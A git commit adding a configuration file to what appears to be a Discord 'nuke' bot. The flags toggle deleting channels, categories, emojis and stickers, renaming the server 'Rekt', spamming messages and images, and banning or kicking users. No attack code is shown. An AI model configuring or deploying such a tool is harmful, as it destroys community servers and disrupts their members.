ad13b53c5ea9b5ebd1677bd8e072bfc78a51138a
giplgwm <98342753+giplgwm@users.noreply.github.com>
2023-09-22 21:10:12 -0400

    Separated bot (main) and nuke (utils) logic, and extracted config into its own file

---
+++ config.py
@@ -0,0 +1,26 @@
+new_server_name = "Rekt"
+text_channel_name = "spam_text"
+voice_channel_name = "spam_voice"
+category_name = "spam_category"
+spam_message = "get rekt"
+spam_img = "spam_img.png"
+
+num_spam_channels = 4
+
+b_spam_text_channels = True
+b_create_categories = True
+b_create_voice_channels = True
+b_create_text_channels = True
+b_delete_text_channels = True
+b_delete_voice_channels = True
+b_delete_categories = True
+b_ban_users = False
+b_kick_users = False
+b_delete_emojis = True
+b_delete_stickers = True
+b_spam_images = True
+b_spam_reacts = True
+b_nuke_on_join = False
+b_nuke_on_command = True
+b_backup = False
+b_restore = False
